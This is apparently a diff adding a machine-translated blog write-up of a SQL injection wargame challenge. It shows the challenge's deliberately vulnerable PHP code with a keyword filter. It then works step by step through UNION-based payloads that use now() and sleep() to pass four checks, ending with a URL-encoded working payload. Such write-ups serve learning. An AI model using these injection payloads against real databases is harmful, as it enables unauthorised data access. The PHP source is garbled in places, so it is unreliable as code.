@@ -1,0 +1,50 @@
+https://blog.hamayanhamayan.com/entry/2020/08/12/191311
+
+<? php 
+include  "./config.php" ;
+login_chk () ;
+ $ db  = dbconnect () ;
+ if ( preg_match ( '/ admin | and | or | if | coalesce | case | _ | \. | Prob | time / i' , $ _GET [ 'no' ]))  exit ( "No Hack ~ _ ~" ) ;
+ $ query  =  "select id from prob_alien where no = { $ _GET [ no ]} " ;
+ echo  "<hr> query: <strong> { $ query } </ strong> < hr> <br> " ; " ;
+$ query2 =  "select id from prob_alien where no =' { $ _GET [ no ]} '" ;
+ echo  "<hr> query2: <strong> { $ query2 } </ strong> <hr> <br>" ;
+ if ( $ _GET) [ 'no' ]) { 
+    $ r  =  mysqli_fetch_array ( mysqli_query ( $ db , $ query )) ;
+     if ( $ r [ 'id' ]  ! ==  "admin")  exit( "sandbox1" ) ;
+     $ r  =  mysqli_fetch_array ( mysqli_query ( $ db , $ query )) ;
+     if ( $ r [ 'id' ]  ===  "admin" )  exit ( "sandbox2" ) ;
+     $ r  =  mysqli_fetch_array ( mysqli_query) ( $ db , $ query2 )) ;
+     if ( $ r ['id' ]  ===  "admin" )  exit ( "sandbox" ) ;
+     $ r  =  mysqli_fetch_array ( mysqli_query ( $ db , $ query2 )) ;
+     if ( $ r [ 'id' ]  ===  "admin" ) solve ( "alien" ) ;
+ } 
+highlight_file ( __FILE__ ) ;
+
+The features are as follows.
+
+    no can be entered
+        admin,and,or,if,coalesce,case,_,.,prob,timeIs filtering
+    Make two types of queries and go through four barriers
+        The result of query 1 is admin
+        Query 1 result is not admin
+        Query 2 result is not admin
+        The result of query 2 is admin
+
+It seems difficult to rewrite the contents, so should I use random numbers?
+If it's about 1/16, I think I can go if I do it several times.
+When I try to use RAND, I can't use and because I can't use it.
+
+When it comes to ... is it time?
+1 union select char(97,100,109,105,110) #
+For the time being, confirm that it will be sandbox2.
+Use the last digit of time.
+1 union select char(97+now()%2,100,109,105,110) #
+I tried this, but when I think about it, the number of seconds doesn't change. Do I need to put a wait?
+1 union select char(97+now()%2,100,109,105,110) union select sleep(1) #
+Likely to go.
+The back is a character string, but you can put a comma and add the same one to the back.
+It's fine, but since the back is admin / none is reversed, adjust the number a little.
+1 union select char(97+now()%2,100,109,105,110) union select sleep(1) #' union select char(96+now()%2,100,109,105,110) union select sleep(1) #
+Answer that + and # are sent by URL-encoding.
+1 union select char(97%2bnow()%2,100,109,105,110) union select sleep(1) %23' union select char(96%2bnow()%2,100,109,105,110) union select sleep(1) %23
